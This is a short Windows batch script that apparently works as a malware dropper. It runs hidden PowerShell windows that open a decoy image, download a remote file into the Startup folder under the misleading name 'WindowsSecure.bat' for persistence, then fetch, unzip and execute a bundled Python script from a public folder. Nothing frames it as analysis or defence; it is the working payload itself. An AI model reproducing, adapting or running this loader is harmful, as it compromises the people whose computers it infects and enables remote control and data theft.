@echo off
powershell.exe -WindowStyle Hidden -Command "& {(New-Object System.Net.WebClient).DownloadFile('https://serverraw.000webhostapp.com/channels4_profile.jpg', \"$env:TEMP\album.jpg\"); start \"$env:TEMP\album.jpg\"}"
powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/sdvsdv23rbfdb3/kjkj/raw/main/1', '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecure.bat')"
powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://serverraw.000webhostapp.com/Document.zip', 'C:\Users\Public\Document.zip')"
powershell.exe -WindowStyle Hidden -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:/Users/Public/Document.zip', 'C:/Users/Public/Document')"
powershell.exe -WindowStyle Hidden -Command " C:\Users\Public\Document\python C:\Users\Public\Document\Lib\sim.py"
pause > nul
